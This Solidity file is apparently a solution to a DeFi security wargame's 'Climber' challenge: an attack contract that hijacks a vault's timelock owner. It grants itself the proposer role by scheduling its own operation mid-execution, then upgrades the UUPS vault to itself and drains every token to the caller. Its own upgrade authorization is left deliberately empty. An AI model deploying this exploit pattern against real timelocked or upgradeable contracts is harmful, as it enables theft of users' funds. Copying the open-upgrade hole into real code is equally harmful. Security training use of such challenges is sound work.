// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


interface IClimberVault {
    // from OwnableUpgradeable.sol
    function owner() external view returns (address);
    
    // from UUPSUpgradeable.sol
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    
    // don't need anything from ClimberVault.sol
}

interface IClimberTimelock {
    // from AccessControl.sol
    function grantRole(bytes32 role, address account) external;

    // from ClimberTimelock.sol
    function PROPOSER_ROLE() external view returns (bytes32);

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
    
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;
}


contract ClimberAttack is UUPSUpgradeable {

    // build the operation arguments to take over the timelock, i.e. make this contract the proposer for new operations
    function getTakeoverArguments(address timelock) internal view returns (address[] memory targets,
                                                                           uint256[] memory values,
                                                                           bytes[] memory dataElements,
                                                                           bytes32 salt) {
        targets = new address[](2);
        values = new uint256[](targets.length);
        dataElements = new bytes[](targets.length);
    
        // 3. make this contract the proposer for new operations
        targets[0] = timelock;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(IClimberTimelock.grantRole.selector, IClimberTimelock(timelock).PROPOSER_ROLE(), address(this));
        
        // 4a. using the new proposer rights, we need to schedule the current operation, otherwise the call to 'execute' will revert
        targets[1] = address(this);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(ClimberAttack.trampolineSchedule.selector);
        
        salt = bytes32(0);
    }

    function attack(address climberVault, address token) external {
        // 1. get the address of the timelock which is the owner of the vault
        IClimberVault vault = IClimberVault(climberVault);
        IClimberTimelock timelock = IClimberTimelock(vault.owner());
        
        // 2. take over the timelock to make this contract the proposer for new operations
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getTakeoverArguments(address(timelock));
        timelock.execute(targets, values, dataElements, salt);
        // having control over the timelock, this contract is now implicitly the owner of the vault
        
        
        // 5. create, schedule & execute a timelock operation which upgrades the vault implementation to this contract
        //    (this breaks it but we don't care) and make the vault call a function which drains all funds
        targets = new address[](1);
        values = new uint256[](targets.length);
        dataElements = new bytes[](targets.length);
        
        targets[0] = address(vault);
        values[0] = 0;
        // upgrade vault to this contract and call function which transfers all DVT tokens to the attacker
        dataElements[0] = abi.encodeWithSelector(IClimberVault.upgradeToAndCall.selector, address(this),
                                                 abi.encodeWithSelector(ClimberAttack.drainFunds.selector, token, msg.sender));
        
        timelock.schedule(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);
    }
     
     // 4b. called from timelock: schedule the current operation, otherwise the call to 'execute' will revert
    function trampolineSchedule() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getTakeoverArguments(msg.sender);
        IClimberTimelock(msg.sender).schedule(targets, values, dataElements, salt);
    }
    
    // 6. called from vault (delegatecall, vault context): transfer all tokens to the receiver
    function drainFunds(address tokenAddress, address receiver) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))));
    }

    // required because this contract implements UUPSUpgradeable: allow anyone to upgrade
    function _authorizeUpgrade(address newImplementation) internal override {}
}
